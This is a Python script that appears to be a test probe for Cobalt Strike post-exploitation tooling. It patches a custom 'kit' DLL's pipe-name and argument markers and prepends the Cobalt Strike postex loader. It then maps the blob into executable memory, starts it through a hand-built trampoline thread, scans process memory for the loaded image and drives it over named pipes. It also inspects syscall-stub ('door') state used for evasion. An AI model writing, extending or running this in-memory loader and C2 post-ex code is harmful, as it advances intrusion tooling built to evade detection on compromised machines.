# -*- coding: utf-8 -*-
"""kit_bg_probe.py v2 - suspend-free observation of the kit DLL bg flow.
Evidence collected by pure memory/pipe reads (no SuspendThread - it
deadlocks against the kit's loader-lock/init chain):
  - OUT pipe chunks   -> first-BOF runner output (spawner handoff proof)
  - kitbase+0x45A10   -> bg stub event handle (non-zero = bg stub RAN)
  - kitbase+0x45A40   -> bg stub task queue head
  - door slots        -> last syscall-door target/SSN used
  - thread count      -> bg thread existence (indirect)"""
import ctypes
import struct
import sys
import time
from ctypes import wintypes

STAMP = str(int(time.time()))
CTRL = r"\\.\pipe\kit_probe_c_" + STAMP
OUT = r"\\.\pipe\kit_probe_o_" + STAMP
PUB = r"C:\Users\Public"
LOADER = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
          r"\p3-llvm-bench\src\main\resources\resources\postex-loader.x64.bin")

k32 = ctypes.windll.kernel32
k32.VirtualAlloc.restype = ctypes.c_void_p
k32.ReadProcessMemory.restype = wintypes.BOOL
k32.ReadProcessMemory.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                                  ctypes.c_void_p, ctypes.c_size_t,
                                  ctypes.POINTER(ctypes.c_size_t)]
k32.GetCurrentProcess.restype = wintypes.HANDLE
k32.CreateFileW.restype = wintypes.HANDLE
k32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                            wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD,
                            wintypes.HANDLE]
k32.PeekNamedPipe.restype = wintypes.BOOL
k32.PeekNamedPipe.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
                              ctypes.POINTER(wintypes.DWORD),
                              ctypes.POINTER(wintypes.DWORD),
                              ctypes.POINTER(wintypes.DWORD)]
k32.ReadFile.restype = wintypes.BOOL
k32.ReadFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
                         ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
k32.VirtualQueryEx.restype = ctypes.c_size_t
k32.VirtualQueryEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                               ctypes.c_void_p, ctypes.c_size_t]
k32.WriteFile.restype = wintypes.BOOL
k32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
                          ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
k32.CloseHandle.argtypes = [wintypes.HANDLE]

WIRE = open(PUB + r"\bt_hello_kit_wire.bin", "rb").read()


def L(b):
    return struct.pack(">i", len(b)) + b


ARGS = (struct.pack(">i", 0) + struct.pack(">i", 2) + struct.pack(">i", 1)
        + L(b"ntdll.dll!RtlUserThreadStart+0x21\x00")
        + L(OUT.encode() + b"\x00") + L(WIRE))

PIPEMARK = b"POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE"
FULLPIPE_MARK = b"\\\\.\\pipe\\" + PIPEMARK
ARGSMARK = b"_POSTEX_ARGUMENTS_"


def load_secs(d):
    e = struct.unpack_from("<I", d, 0x3C)[0]
    nsec = struct.unpack_from("<H", d, e + 6)[0]
    sect = e + 0x18 + struct.unpack_from("<H", d, e + 0x14)[0]
    secs = []
    for k in range(nsec):
        s = sect + k * 40
        nm = d[s:s + 8].rstrip(b"\x00").decode(errors="replace")
        vsz, va, rsz, ro = struct.unpack_from("<IIII", d, s + 8)
        secs.append((nm, va, vsz, ro, rsz))
    return secs


def off2rva(secs, off):
    for nm, va, vsz, ro, rsz in secs:
        if ro <= off < ro + rsz:
            return va + (off - ro)
    return None


def patch_kit():
    kit = open(PUB + r"\kit_async.x64.dll", "rb").read()
    secs = load_secs(kit)
    d = bytearray(kit)
    i = bytes(d).find(FULLPIPE_MARK)
    assert i > 0
    name = CTRL.encode() + b"\x00"
    name += b"\x00" * (len(FULLPIPE_MARK) - len(name))
    d[i:i + len(FULLPIPE_MARK)] = name
    mark_rva = off2rva(secs, i)
    j = bytes(d).find(ARGSMARK)
    assert j > 0
    hdr = (struct.pack("<i", 0x0A2A1DE0) + b"AAAA" + b"N" + b"\x00\x00\x00"
           + struct.pack("<i", 1 << 20) + struct.pack("<i", len(ARGS)))
    d[j:j + 20] = hdr
    # C-28 inline patches: spawner call sites -> call the runner directly
    # (thread path fails with error 0x4F; inline path is proven by A4)
    tn, tva, tvsz, tro, trsz = [x for x in secs if x[0] == ".text"][0]
    for site in ():  # PURE KIT TEST: no inline patches
        fo = tro + (site - tva)
        assert d[fo] == 0xE8, hex(site)
        # original: call 0x3f00 (spawner); rel32 = 0x3f00 - (site + 5)
        oldrel = struct.unpack_from("<i", d, fo + 1)[0]
        assert site + 5 + oldrel == 0x3f00, hex(site)
        newrel = 0x3d40 - (site + 5)
        struct.pack_into("<i", d, fo + 1, newrel)
    patched = bytes(d)
    open(PUB + r"\kit_probe_patched.dll", "wb").write(patched)
    blob = open(LOADER, "rb").read() + patched
    open(PUB + r"\kit_probe_blob.bin", "wb").write(blob)
    open(PUB + r"\kit_probe_args.bin", "wb").write(ARGS)
    return mark_rva


def readmem(h, a, n):
    buf = ctypes.create_string_buffer(n)
    got = ctypes.c_size_t(0)
    if k32.ReadProcessMemory(h, ctypes.c_void_p(a), buf, n,
                             ctypes.byref(got)) and got.value:
        return buf.raw[:got.value]
    return None


def scan_region(h, addr, size, mark):
    CH = 0x400000
    a, left = addr, size
    while left > 0:
        n = min(CH, left)
        raw = readmem(h, a, n)
        if raw:
            p = raw.find(mark)
            while p >= 0:
                kb = a + p - MARKRVA
                if kb > 0x10000 and readmem(h, kb, 2) == b"MZ":
                    return kb
                p = raw.find(mark, p + 1)
        a += n
        left -= n
    return None


def find_kitbase(h, mark):
    mbi = ctypes.create_string_buffer(48)
    kb = None
    for rnd in range(40):
        pri = {0x40: [], 0x20: [], 0x08: [], 0x04: []}
        addr = 0
        while addr < 0x7FFFFFFEFFFF:
            if not k32.VirtualQueryEx(h, ctypes.c_void_p(addr), mbi, 48):
                break
            state = struct.unpack_from("<I", mbi, 32)[0]
            protect = struct.unpack_from("<I", mbi, 36)[0]
            typ = struct.unpack_from("<I", mbi, 40)[0]
            size = struct.unpack_from("<Q", mbi, 24)[0]
            if state == 0x1000 and typ == 0x20000 and \
                    size <= 0x1000000 and protect in pri:
                pri[protect].append((addr, size))
            addr += size
        for pr in (0x40, 0x20, 0x08, 0x04):
            for a, sz in pri[pr]:
                kb = scan_region(h, a, sz, mark)
                if kb:
                    return kb
        time.sleep(0.3)
    return None


def connect_pipe(name, timeout):
    GENERIC_RW = 0x80000000 | 0x40000000
    t0 = time.time()
    while time.time() - t0 < timeout:
        h = k32.CreateFileW(name, GENERIC_RW, 0, None, 3, 0, None)
        if h and h != wintypes.HANDLE(-1).value:
            return h
        time.sleep(0.2)
    return None


def drain_pipe(h, label):
    total = b""
    for _ in range(40):
        avail = wintypes.DWORD(0)
        if not k32.PeekNamedPipe(h, None, 0, None, ctypes.byref(avail),
                                 None) or not avail.value:
            break
        buf = ctypes.create_string_buffer(0x10000)
        got = wintypes.DWORD(0)
        if not k32.ReadFile(h, buf, 0x10000, ctypes.byref(got), None) or \
                not got.value:
            break
        total += buf.raw[:got.value]
    if total:
        txt = "".join(chr(c) if 32 <= c < 127 else "." for c in total[:200])
        print("%s: %dB %s" % (label, len(total),
                              total[:96].hex()), flush=True)
        print("%s txt: %s" % (label, txt), flush=True)
    else:
        print("%s: (empty)" % label, flush=True)
    return total


def qword(a):
    raw = readmem(k32.GetCurrentProcess(), a, 8)
    return struct.unpack("<Q", raw)[0] if raw else 0


def dword(a):
    raw = readmem(k32.GetCurrentProcess(), a, 4)
    return struct.unpack("<I", raw)[0] if raw else 0


def observe(kitbase, ho, hc, label):
    print("---- %s ----" % label, flush=True)
    if ho:
        drain_pipe(ho, "OUT")
    if kitbase:
        ev = qword(kitbase + 0x45A10)
        queue = qword(kitbase + 0x45A40)
        door_t = qword(kitbase + 0x45A00)
        door_s = dword(kitbase + 0x45A08)
        print("bg_event(45A10)=0x%x bg_queue(45A40)=0x%x" % (ev, queue),
              flush=True)
        print("door_target=0x%x door_ssn=0x%x" % (door_t, door_s), flush=True)


def main():
    global MARKRVA
    mark_rva = patch_kit()
    MARKRVA = mark_rva
    h = k32.GetCurrentProcess()
    blob = open(PUB + r"\kit_probe_blob.bin", "rb").read()
    base = k32.VirtualAlloc(None, len(blob), 0x3000, 0x40)
    ctypes.memmove(base, blob, len(blob))
    tramp = k32.VirtualAlloc(None, 0x1000, 0x3000, 0x40)
    code = bytearray(11)
    code[0] = 0x41
    code[1] = 0xB9
    code[2:6] = struct.pack("<I", 1)
    code[6] = 0xE9
    code[7:11] = struct.pack("<i", base - (tramp + 11))
    ctypes.memmove(tramp, bytes(code), 11)
    ab = k32.VirtualAlloc(None, len(ARGS), 0x3000, 0x04)
    ctypes.memmove(ab, ARGS, len(ARGS))
    thd = wintypes.DWORD()
    k32.CreateThread(None, 0, ctypes.cast(tramp, wintypes.LPVOID),
                     ctypes.c_void_p(ab), 0, ctypes.byref(thd))
    print("kit thread launched (blob 0x%x)" % base, flush=True)
    kitbase = None
    for _ in range(40):
        time.sleep(0.5)
        kitbase = find_kitbase(h, CTRL.encode())
        if kitbase:
            break
    if not kitbase:
        print("kit image never mapped")
        return
    print("kitbase=0x%x" % kitbase, flush=True)
    hc = connect_pipe(CTRL, 30)
    print("ctrl connected:", bool(hc), flush=True)
    ho = connect_pipe(OUT, 60)
    print("out connected:", bool(ho), flush=True)
    observe(kitbase, ho, hc, "T+0")
    time.sleep(4)
    observe(kitbase, ho, hc, "T+4")
    # send the [z][b] follow-up frame over CTRL (official bg frame);
    # the follow-up job's runner creates a NEW OUT pipe instance and
    # blocks in ConnectNamedPipe until a client connects again
    if hc:
        FOLLOW = L(OUT.encode() + b"\x00") + L(WIRE)
        wr = wintypes.DWORD(0)
        ok = k32.WriteFile(hc, FOLLOW, len(FOLLOW), ctypes.byref(wr), None)
        print("follow-up [z][b] sent to CTRL:", bool(ok), wr.value,
              flush=True)
        time.sleep(2)
        ho2 = connect_pipe(OUT, 30)
        print("out reconnected (2nd client):", bool(ho2), flush=True)
        if ho2:
            drain_pipe(ho2, "OUT2")
            time.sleep(2)
            drain_pipe(ho2, "OUT2b")
    observe(kitbase, ho, hc, "T+final")
    print("DONE", flush=True)


if __name__ == "__main__":
    main()
